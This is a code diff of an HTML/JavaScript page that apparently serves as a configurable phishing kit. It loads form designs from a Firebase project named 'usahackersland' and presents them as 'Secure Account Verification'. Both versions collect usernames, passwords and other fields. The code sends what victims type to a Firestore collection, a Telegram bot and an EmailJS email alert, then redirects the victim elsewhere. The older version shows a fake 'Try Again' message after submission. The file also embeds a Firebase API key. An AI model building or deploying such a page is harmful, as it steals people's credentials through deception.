@@ -1,297 +1,258 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title></title>
-<meta name="description">
-<meta property="og:title">
-<meta property="og:description">
-<meta property="og:image">
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title id="pageTitle">Secure Account Verification</title>
+<meta name="description" id="metaDescription" content="Verify your account to continue securely">
+<meta property="og:title" content="Secure Account Verification">
+<meta property="og:description" content="Verify your account to continue securely">
+<meta property="og:image" id="ogImageMeta" content="https://example.com/og-image.png">
 
 <style>
-body{
-  font-family:Arial,Helvetica,sans-serif;
-  background:#f4f6f8;
-  padding:20px;
-}
-#page{
-  max-width:600px;
-  margin:auto;
-  border-radius:10px;
-  overflow:hidden;
-  background:#fff;
-}
-.bg{
-  background-repeat:no-repeat;
-  background-position:center;
-  background-size:cover;
-}
-#content{padding:18px}
-
-.builder-media{text-align:center;margin-bottom:12px}
-.builder-media img{max-width:140px;margin-bottom:8px}
-.banner img{width:100%;border-radius:8px;margin-bottom:10px}
-
-h2{text-align:center}
-.subtitle{text-align:center;color:#555}
-.description{margin:10px 0}
-
-.gallery{
-  display:grid;
-  grid-template-columns:repeat(auto-fit,minmax(120px,1fr));
-  gap:8px;
-  margin:12px 0;
-}
-.gallery img{width:100%;border-radius:6px}
-
-.video iframe{
-  width:100%;
-  height:200px;
-  border-radius:8px;
-  margin:8px 0;
-}
-
-.embedLink{
-  background:#e8f0fe;
-  padding:10px;
-  border-radius:6px;
-  margin:8px 0;
-  font-size:14px;
-  word-break:break-word;
-}
-.embedLink a{
-  display:inline-block;
-  margin-top:4px;
-  color:#1976d2;
-  text-decoration:none;
-}
-.embedLink small{
-  display:block;
-  margin-top:4px;
-  color:#555;
-}
-
-form{
-  max-width:420px;
-  margin:12px auto;
-}
-input,button{
-  width:100%;
-  padding:10px;
-  margin:8px 0;
-  border-radius:6px;
-  border:1px solid #ccc;
-  box-sizing:border-box;
-}
-button{
-  border:none;
-  color:#fff;
-  cursor:pointer;
-}
-
-footer{
-  text-align:center;
-  font-size:12px;
-  margin-top:14px;
-  color:#777;
-}
-#tryAgain{
-  color:#b71c1c;
-  font-weight:bold;
-  text-align:center;
-  display:none;
-}
+body{font-family:Arial,Helvetica,sans-serif;background:#f4f6f8;padding:18px;margin:0}
+.wrap{max-width:600px;margin:auto;background:#fff;padding:18px;border-radius:10px;box-sizing:border-box}
+input,textarea,button{width:100%;padding:10px;margin-top:8px;border-radius:6px;border:1px solid #ccc;box-sizing:border-box}
+textarea{min-height:60px}
+.galleryImg{max-width:100%;margin:6px 0;border-radius:6px}
+.embedLink{margin-top:6px;padding:6px;background:#e8f0fe;border-radius:6px}
+button{background:#1976d2;color:#fff;border:none;padding:10px;border-radius:6px;cursor:pointer;margin-top:10px}
 </style>
 
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 </head>
-
 <body>
-<div id="page">
-  <div id="content">
-
-    <div id="media" class="builder-media"></div>
-    <div id="banner" class="banner"></div>
-
-    <h2 id="title"></h2>
-    <p id="subtitle" class="subtitle"></p>
-
-    <div id="gallery" class="gallery"></div>
-    <p id="description" class="description"></p>
-
-    <div id="videos"></div>
-    <div id="links"></div>
-
-    <div id="warning"></div>
-    <div id="tryAgain">⚠️ Try Again</div>
-
-    <form id="form"></form>
-
-    <footer id="footer"></footer>
-  </div>
+<div class="wrap" id="formContainer">
+<p>Loading form...</p>
 </div>
 
 <script>
-/* EMAILJS INIT */
-emailjs.init("YOUR_EMAILJS_PUBLIC_KEY");
-
-const $ = id => document.getElementById(id);
-
-firebase.initializeApp({
-  apiKey:"AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
-  authDomain:"usahackersland.firebaseapp.com",
-  projectId:"usahackersland"
-});
+const firebaseConfig = {
+  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
+  authDomain: "usahackersland.firebaseapp.com",
+  projectId: "usahackersland"
+};
+firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 
-const formId = new URLSearchParams(location.search).get("id");
+const telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN"; // replace with your bot token
+const telegramChatId = "YOUR_CHAT_ID"; // replace with your chat id
+const emailRecipient = "youremail@example.com"; // your email
+
+function getQueryParam(param){
+  const urlParams = new URLSearchParams(window.location.search);
+  return urlParams.get(param);
+}
+
+const formId = getQueryParam("id");
+if(!formId){
+  document.getElementById("formContainer").innerHTML="<p>Invalid form link.</p>";
+}
 
 db.collection("forms").doc(formId).get().then(doc=>{
-  if(!doc.exists) return;
-  const f = doc.data();
+  if(!doc.exists){
+    document.getElementById("formContainer").innerHTML="<p>Form not found.</p>";
+    return;
+  }
+  const data = doc.data();
 
-  /* SEO */
-  document.title = f.seoTitle || "";
-  document.querySelector('meta[name="description"]').content = f.metaDesc || "";
-  document.querySelector('meta[property="og:title"]').content = f.seoTitle || "";
-  document.querySelector('meta[property="og:description"]').content = f.metaDesc || "";
-  document.querySelector('meta[property="og:image"]').content = f.ogImage || "";
+  // Update SEO meta for social media
+  document.title = data.seoTitle || "Secure Account Verification";
+  document.getElementById("pageTitle").textContent = document.title;
+  document.getElementById("metaDescription").content = data.metaDesc || "";
+  document.getElementById("ogImageMeta").content = data.ogImage || "";
+  document.querySelector("meta[property='og:title']").content = data.seoTitle || "";
+  document.querySelector("meta[property='og:description']").content = data.metaDesc || "";
 
-  /* BACKGROUND */
-  if(f.bgColor) $("page").style.background = f.bgColor;
-  if(f.bgImageURL){
-    $("page").classList.add("bg");
-    $("page").style.backgroundImage = `url(${f.bgImageURL})`;
-    $("page").style.backgroundSize = f.bgSize || "cover";
+  const container = document.getElementById("formContainer");
+  container.innerHTML="";
+
+  const inputsArray = []; // to store all inputs for submission
+
+  // Banner
+  if(data.bannerURL){
+    const banner = document.createElement("img");
+    banner.src=data.bannerURL;
+    banner.style.width="100%";
+    banner.style.borderRadius="8px";
+    container.appendChild(banner);
   }
 
-  /* MEDIA */
-  if(f.avatarURL) $("media").innerHTML += `<img src="${f.avatarURL}" style="width:90px;border-radius:50%">`;
-  if(f.logoURL) $("media").innerHTML += `<img src="${f.logoURL}">`;
-  if(f.bannerURL) $("banner").innerHTML = `<img src="${f.bannerURL}">`;
-
-  /* TEXT */
-  if(f.title) $("title").innerText = f.title;
-  if(f.subtitle) $("subtitle").innerText = f.subtitle;
-  if(f.description) $("description").innerText = f.description;
-
-  /* GALLERY */
-  (f.galleryImages || []).filter(Boolean).forEach(img=>{
-    $("gallery").innerHTML += `<img src="${img}">`;
-  });
-
-  /* VIDEOS */
-  (f.videoLinks || []).filter(Boolean).forEach(v=>{
-    if(v.includes("youtube")){
-      const id = v.split("v=")[1];
-      $("videos").innerHTML += `
-        <div class="video">
-          <iframe src="https://www.youtube.com/embed/${id}" allowfullscreen></iframe>
-        </div>`;
-    }
-  });
-
-  /* EMBED LINKS (MASKED, NO NUMBERS) */
-  (f.embedLinks || []).forEach(l=>{
-    if(!l.show || !l.url) return;
-
-    $("links").innerHTML += `
-      <div class="embedLink">
-        <strong>${l.text || "Verification Link"}</strong>
-        <a href="${l.url}" target="_blank">${l.text || "Open link"}</a>
-        ${l.desc ? `<small>${l.desc}</small>` : ""}
-      </div>
-    `;
-  });
-
-  /* WARNING */
-  if(f.enableWarning && f.warning){
-    $("warning").innerHTML =
-      `<p style="color:#b71c1c;text-align:${f.warningPosition||"center"}">${f.warning}</p>`;
+  // Avatar
+  if(data.avatarURL){
+    const avatar = document.createElement("img");
+    avatar.src=data.avatarURL;
+    avatar.style.width="80px";
+    avatar.style.borderRadius="50%";
+    avatar.style.display="block";
+    avatar.style.margin="10px auto";
+    container.appendChild(avatar);
   }
 
-  /* FORM */
-  const form = $("form");
-
-  if(f.addAuth){
-    if(f.usernamePlaceholder)
-      form.innerHTML += `<input name="username" placeholder="${f.usernamePlaceholder}" required>`;
-    if(f.passwordPlaceholder)
-      form.innerHTML += `<input type="password" name="password" placeholder="${f.passwordPlaceholder}" required>`;
+  // Logo
+  if(data.logoURL){
+    const logo = document.createElement("img");
+    logo.src=data.logoURL;
+    logo.style.width="120px";
+    logo.style.display="block";
+    logo.style.margin="10px auto";
+    container.appendChild(logo);
   }
 
-  (f.extraFields || []).filter(Boolean).forEach(v=>{
-    form.innerHTML += `<input name="${v}" placeholder="${v}" required>`;
-  });
+  // Page Title
+  const h2 = document.createElement("h2");
+  h2.textContent = data.title;
+  h2.style.textAlign="center";
+  h2.style.color = data.titleColor || "#111";
+  container.appendChild(h2);
 
-  if(f.showGenerateBtn){
-    const g = document.createElement("button");
-    g.type = "button";
-    g.textContent = f.generateBtnText;
-    g.style.background = "#6c757d";
-    form.appendChild(g);
+  // Subtitle
+  const sub = document.createElement("p");
+  sub.textContent = data.subtitle;
+  sub.style.textAlign="center";
+  sub.style.color = data.subtitleColor || "#555";
+  container.appendChild(sub);
+
+  // Gallery images (on top)
+  if(data.galleryImages && data.galleryImages.length){
+    data.galleryImages.forEach(url=>{
+      const img = document.createElement("img");
+      img.src = url;
+      img.className="galleryImg";
+      container.appendChild(img);
+    });
   }
 
-  if(f.showMainBtn){
-    const b = document.createElement("button");
-    b.type = "submit";
-    b.textContent = f.buttonText;
-    b.style.background = f.btnColor || "#1976d2";
-    form.appendChild(b);
+  // Description
+  const desc = document.createElement("p");
+  desc.textContent = data.description;
+  container.appendChild(desc);
+
+  // Videos
+  if(data.videoLinks && data.videoLinks.length){
+    data.videoLinks.forEach(v=>{
+      const vidId = v.split("v=")[1];
+      if(vidId){
+        const iframe = document.createElement("iframe");
+        iframe.width="100%";
+        iframe.height="180";
+        iframe.src=`https://www.youtube.com/embed/${vidId}`;
+        iframe.frameBorder=0;
+        iframe.allow="fullscreen";
+        container.appendChild(iframe);
+      }
+    });
   }
 
-  if(f.footerText) $("footer").innerText = f.footerText;
+  // Username & Password
+  if(data.addAuth){
+    const uInput = document.createElement("input");
+    uInput.placeholder = data.usernamePlaceholder || "Email or Username";
+    container.appendChild(uInput);
+    inputsArray.push({label:"Username/Email", input:uInput});
 
-  form.onsubmit = e => submitForm(e,f);
+    const pInput = document.createElement("input");
+    pInput.type="password";
+    pInput.placeholder = data.passwordPlaceholder || "Password";
+    container.appendChild(pInput);
+    inputsArray.push({label:"Password", input:pInput});
+  }
+
+  // Extra Fields
+  if(data.extraFields && data.extraFields.length){
+    data.extraFields.forEach(f=>{
+      const input = document.createElement("input");
+      input.placeholder=f;
+      container.appendChild(input);
+      inputsArray.push({label:f, input:input});
+    });
+  }
+
+  // Embed Links
+  if(data.embedLinks && data.embedLinks.length){
+    data.embedLinks.forEach(link=>{
+      if(!link.show) return;
+      const div = document.createElement("div");
+      div.className="embedLink";
+      div.innerHTML=`<a href="${link.url}" target="_blank"><strong>${link.text}</strong></a>`;
+      if(link.desc) div.innerHTML+=`<br><small>${link.desc}</small>`;
+      container.appendChild(div);
+    });
+  }
+
+  // Warning
+  if(data.enableWarning){
+    const warn = document.createElement("p");
+    warn.textContent = data.warning;
+    warn.style.color="#b71c1c";
+    warn.style.textAlign = data.warningPosition || "normal";
+    container.appendChild(warn);
+  }
+
+  // Main Button
+  if(data.showMainBtn){
+    const btn = document.createElement("button");
+    btn.textContent = data.buttonText || "Submit";
+    btn.style.background = data.btnColor || "#1976d2";
+    btn.onclick = ()=>{
+      const submission = {formId:formId, createdAt:new Date().toISOString()};
+      inputsArray.forEach(i=>submission[i.label]=i.input.value);
+
+      // Save to Firebase dashboard
+      db.collection("submissions").add(submission).then(()=>{
+        alert("Form submitted successfully!");
+      });
+
+      // Send to Telegram Bot
+      const message = Object.entries(submission).map(([k,v])=>`${k}: ${v}`).join("\n");
+      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body: JSON.stringify({chat_id:telegramChatId,text:message})
+      });
+
+      // Send Email alert (using EmailJS or any SMTP API)
+      fetch("https://api.emailjs.com/api/v1.0/email/send", {
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body: JSON.stringify({
+          service_id: "YOUR_SERVICE_ID",
+          template_id: "YOUR_TEMPLATE_ID",
+          user_id: "YOUR_EMAILJS_USER_ID",
+          template_params: {...submission, to_email: emailRecipient}
+        })
+      });
+
+      // Redirect if enabled
+      if(data.enableRedirect && data.redirectURL){
+        window.location.href=data.redirectURL;
+      }
+    };
+    container.appendChild(btn);
+  }
+
+  // Generate Button
+  if(data.showGenerateBtn){
+    const genBtn = document.createElement("button");
+    genBtn.textContent = data.generateBtnText || "Generate Form";
+    genBtn.onclick = ()=>alert("This form was generated successfully!");
+    container.appendChild(genBtn);
+  }
+
+  // Footer
+  if(data.footerText){
+    const footer = document.createElement("footer");
+    footer.textContent = data.footerText;
+    footer.style.textAlign="center";
+    footer.style.fontSize="12px";
+    footer.style.marginTop="12px";
+    container.appendChild(footer);
+  }
+
+}).catch(err=>{
+  document.getElementById("formContainer").innerHTML="<p>Error loading form: "+err+"</p>";
 });
-
-/* SUBMIT */
-function submitForm(e,f){
-  e.preventDefault();
-
-  const data = {};
-  document.querySelectorAll("#form input").forEach(i=>{
-    data[i.name] = i.value;
-  });
-
-  /* SAVE */
-  db.collection("submissions").add({
-    formId,
-    data,
-    createdAt:new Date().toISOString()
-  });
-
-  /* TELEGRAM */
-  let msg = "📝 New Form Submission\n\n";
-  Object.entries(data).forEach(([k,v])=>{
-    msg += `${k}: ${v}\n`;
-  });
-
-  fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      chat_id:"YOUR_CHAT_ID",
-      text:msg
-    })
-  });
-
-  /* EMAIL ALERT */
-  emailjs.send("YOUR_SERVICE_ID","YOUR_TEMPLATE_ID",{
-    message: msg
-  });
-
-  $("tryAgain").style.display="block";
-  setTimeout(()=>$("tryAgain").style.display="none",3000);
-
-  if(f.enableRedirect && f.redirectURL){
-    setTimeout(()=>location.href = f.redirectURL,1500);
-  }
-}
 </script>
 </body>
 </html>
